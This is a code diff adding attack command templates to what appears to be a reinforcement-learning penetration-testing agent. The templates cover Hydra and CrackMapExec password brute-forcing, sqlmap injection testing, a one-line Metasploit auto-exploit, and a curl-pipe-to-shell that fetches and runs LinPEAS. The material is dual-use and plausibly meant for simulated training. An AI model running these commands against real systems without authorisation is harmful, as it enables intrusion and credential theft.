@@ -1464,6 +1464,121 @@ register(CommandTemplate(
     tags={"web", "directories", "bruteforce"}
 ))
 
+# --- Credential Discovery (ENUMERATION → EXPLOITATION bridge) ---
+# These tools discover credentials, enabling phase transition to EXPLOITATION
+register(CommandTemplate(
+    name="hydra_ssh",
+    template="hydra -l {username} -P {wordlist} ssh://{target} -t {threads}",
+    description="Brute-force SSH credentials with Hydra.",
+    phase=AttackPhase.ENUMERATION,
+    required_params=["target"],
+    optional_params={"username": "admin", "wordlist": "/usr/share/wordlists/rockyou.txt", "threads": "4"},
+    preconditions={"ssh_service_found"},
+    success_indicators=["login:", "password:"],
+    typical_reward=8.0,
+    tags={"bruteforce", "ssh", "credentials"}
+))
+
+register(CommandTemplate(
+    name="hydra_ftp",
+    template="hydra -l {username} -P {wordlist} ftp://{target}",
+    description="Brute-force FTP credentials with Hydra.",
+    phase=AttackPhase.ENUMERATION,
+    required_params=["target"],
+    optional_params={"username": "anonymous", "wordlist": "/usr/share/wordlists/rockyou.txt"},
+    preconditions={"ftp_service_found"},
+    success_indicators=["login:", "password:"],
+    typical_reward=7.0,
+    tags={"bruteforce", "ftp", "credentials"}
+))
+
+register(CommandTemplate(
+    name="hydra_http_form",
+    template="hydra -l {username} -P {wordlist} {target} http-post-form '{form}'",
+    description="Brute-force HTTP login form.",
+    phase=AttackPhase.ENUMERATION,
+    required_params=["target", "form"],
+    optional_params={"username": "admin", "wordlist": "/usr/share/wordlists/rockyou.txt"},
+    preconditions={"http_service_found"},
+    success_indicators=["login:", "password:"],
+    typical_reward=8.0,
+    tags={"bruteforce", "http", "credentials", "web"}
+))
+
+register(CommandTemplate(
+    name="cme_smb_bruteforce",
+    template="crackmapexec smb {target} -u {username} -p {wordlist}",
+    description="Brute-force SMB credentials via CrackMapExec.",
+    phase=AttackPhase.ENUMERATION,
+    required_params=["target"],
+    optional_params={"username": "admin", "wordlist": "/usr/share/wordlists/rockyou.txt"},
+    preconditions={"smb_service_found"},
+    success_indicators=["[+]", "Pwn3d!"],
+    typical_reward=9.0,
+    tags={"cme", "smb", "bruteforce", "credentials"}
+))
+
+register(CommandTemplate(
+    name="sqlmap_test",
+    template="sqlmap -u '{url}' --batch --dbs",
+    description="Test for SQL injection and enumerate databases.",
+    phase=AttackPhase.ENUMERATION,
+    required_params=["url"],
+    preconditions={"http_service_found"},
+    success_indicators=["injectable", "DBMS", "available databases"],
+    typical_reward=9.0,
+    tags={"sqli", "database", "web", "credentials"}
+))
+
+register(CommandTemplate(
+    name="searchsploit",
+    template="searchsploit {query}",
+    description="Search for known exploits in Exploit-DB.",
+    phase=AttackPhase.ENUMERATION,
+    required_params=["query"],
+    preconditions=set(),
+    success_indicators=["Exploit", "exploit/", "remote", "local"],
+    typical_reward=3.0,
+    tags={"exploit", "search", "recon"}
+))
+
+# --- Exploitation commands (lower preconditions for simulated training) ---
+register(CommandTemplate(
+    name="msfconsole_auto",
+    template="msfconsole -q -x 'search {query}; use 0; set RHOSTS {target}; exploit'",
+    description="Search and exploit with Metasploit in one command.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target", "query"],
+    preconditions={"services_enumerated"},
+    success_indicators=["session", "opened", "Meterpreter"],
+    typical_reward=10.0,
+    tags={"metasploit", "exploit", "auto"}
+))
+
+register(CommandTemplate(
+    name="sudo_check",
+    template="sudo -l",
+    description="Check sudo privileges for privilege escalation.",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["(ALL)", "NOPASSWD", "may run"],
+    typical_reward=6.0,
+    tags={"privesc", "sudo", "linux"}
+))
+
+register(CommandTemplate(
+    name="linpeas",
+    template="curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+    description="Run LinPEAS for automated Linux privilege escalation enumeration.",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["CVE", "Vulnerable", "SUID", "writable"],
+    typical_reward=5.0,
+    tags={"privesc", "linux", "enum"}
+))
+
 # --- Database Attacks ---
 register(CommandTemplate(
     name="mysql_login",
